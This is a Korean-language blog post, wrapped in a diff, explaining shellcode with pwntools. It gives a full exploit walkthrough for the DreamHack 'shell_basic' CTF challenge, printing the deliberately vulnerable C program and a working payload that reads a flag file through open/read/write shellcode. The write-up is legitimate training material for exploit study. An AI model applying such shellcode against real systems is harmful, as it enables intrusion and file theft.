@@ -1,0 +1,152 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Shellcode &amp; RTS · whrds.log</title><meta name="description" content="Shellcode 시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다. 바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다. pwntools의 기능중에 shellcraft.sh라는 기능이 있다. 셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-shellcode-rts/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-shellcode-rts/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-shellcode-rts/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Shellcode &amp; RTS · whrds.log"><meta property="og:description" content="Shellcode 시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다. 바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다. pwntools의 기능중에 shellcraft.sh라는 기능이 있다. 셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-shellcode-rts/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Shellcode & RTS","description":"Shellcode 시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다. 바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다. pwntools의 기능중에 shellcraft.sh라는 기능이 있다. 셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면","datePublished":"2023-10-22","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-shellcode-rts/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-shellcode-rts/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Shellcode &amp; RTS</h1><p class="article-description">Shellcode 시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다. 바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다. pwntools의 기능중에 shellcraft.sh라는 기능이 있다. 셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면</p><div class="article-meta"><time datetime="2023-10-22">2023년 10월 22일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><h4>Shellcode</h4>
+<p>시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다.</p>
+<p>바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다.</p>
+<p>pwntools의 기능중에 shellcraft.sh라는 기능이 있다.</p>
+<p>셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면 손쉽게 원하는 기능의 셸코드를 제작할 수 있다.</p>
+<pre><code>from pwn import*
+
+shellcode = shellcraft.sh()
+print(shellcode)
+print(hexdump(asm(shellcode)))
+</code></pre>
+<p>함수를 실행했을 때의 결과를 살펴보겠다.</p>
+<p><img src="/assets/images/tistory/tistory-4706b08f72f8/001.png" alt=""></p>
+<p>어셈블리어 부분이 만들어진 코드이고,</p>
+<p>아래 hex값으로 나온 부분이 셸코드의 바이트코드에 해당이 된다.</p>
+<p><a href="http://shellcraft.sh">shellcraft.sh</a>()에서 ()안에 아무것도 안넣어 주었기 때문에 기본적으로 기본 셸을 실행하는 코드가 만들어진다.</p>
+<p>이후에 풀어볼 shell_basic 문제의 경우 특정 파일을 읽는 코드를 만들어야 하기 때문에 </p>
+<p>해당 부분에서 설명을 추가로 하겠다.</p>
+<hr>
+<h4>DreamHack shell_basic 문제</h4>
+<p>shell_basic문제는 드림핵에서 return to shellcode를 실습하는 문제이다.</p>
+<p>먼저 주어진 코드를 살펴보겠다.</p>
+<pre><code>// Compile: gcc -o shell_basic shell_basic.c -lseccomp
+// apt install seccomp libseccomp-dev
+
+#include &lt;fcntl.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;signal.h&gt;
+
+void alarm_handler() {
+    puts(&quot;TIME OUT&quot;);
+    exit(-1);
+}
+
+void init() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(10);
+}
+
+void banned_execve() {
+  scmp_filter_ctx ctx;
+  ctx = seccomp_init(SCMP_ACT_ALLOW);
+  if (ctx == NULL) {
+    exit(0);
+  }
+  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
+  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
+
+  seccomp_load(ctx);
+}
+
+void main(int argc, char *argv[]) {
+  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  void (*sc)();
+
+  init();
+
+  banned_execve();
+
+  printf(&quot;shellcode: &quot;);
+  read(0, shellcode, 0x1000);
+
+  sc = (void *)shellcode;
+  sc();
+}
+</code></pre>
+<p>코드에서 취약점을 먼저 살펴보면</p>
+<pre><code>printf(&quot;shellcode: &quot;);
+read(0, shellcode, 0x1000);
+
+sc = (void *)shellcode;
+sc();
+</code></pre>
+<p>main함수에서 shellcode에 넣은 값을 함수의 기능으로 만들어 실행하고 있다.</p>
+<p>그리고 execve 를 사용하는 셸코드를 사용하지 못하도록 되어 있다.</p>
+<p>문제 페이지를 보면 flag 파일의 경로를 다음과 같이 주어준다.</p>
+<p>/home/shell_basic/flag_name_is_loooooong</p>
+<p>그렇다면 해당 부분을 읽는 셸코드를 생성하면 된다.</p>
+<p>해당 파일을 읽기 위해서는 3가지 과정이 필요하다.</p>
+<p>1. 파일 열기</p>
+<p>2. 파일 내용 읽기</p>
+<p>3. 읽은 내용 출력하기</p>
+<p>때문에 open =&gt; read =&gt; write 순으로 사용을 해야한다.</p>
+<p>이를 코드로 작성하면 다음과 같다.</p>
+<pre><code>shellcraft.open(파일 경로)
+
+shellcraft.read(rax, rsp, 0x100)
+
+shellcraft.write(1,rsp,0x100)
+</code></pre>
+<p>read에서 첫 인자를 rax로 사용한 이유는</p>
+<p>파일에서 사용중인 함수 호출 규약이 sys V이기 때문이다.</p>
+<p>즉, 함수의 반환값을 rax 레지스터에 저장하는데 </p>
+<p>파일이 정상적으로 열렸는지 확인 후 읽는 과정을 수행하기 위해</p>
+<p>반환값을 fd로 사용한 것이다.</p>
+<p>전체 payload를 보면 다음과 같이 구성할 수 있다.</p>
+<p>아래 접은글은 최종 페이로드이다.</p>
+<p>더보기</p>
+<pre><code>p=remote('host3.dreamhack.games',20328)
+context.arch = &quot;amd64&quot;
+
+flag_name = &quot;/home/shell_basic/flag_name_is_loooooong&quot;
+
+payload = shellcraft.open(flag_name)
+payload += shellcraft.read('rax','rsp',0x100)
+payload += shellcraft.write(1,'rsp',0x100)
+
+p.sendlineafter(b&quot;: &quot;,asm(payload))
+print(p.recv())
+
+p.interactive()
+</code></pre>
+<p>실행하면 flag를 정상적으로 읽을 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-4706b08f72f8/002.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-shellcode-rts/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
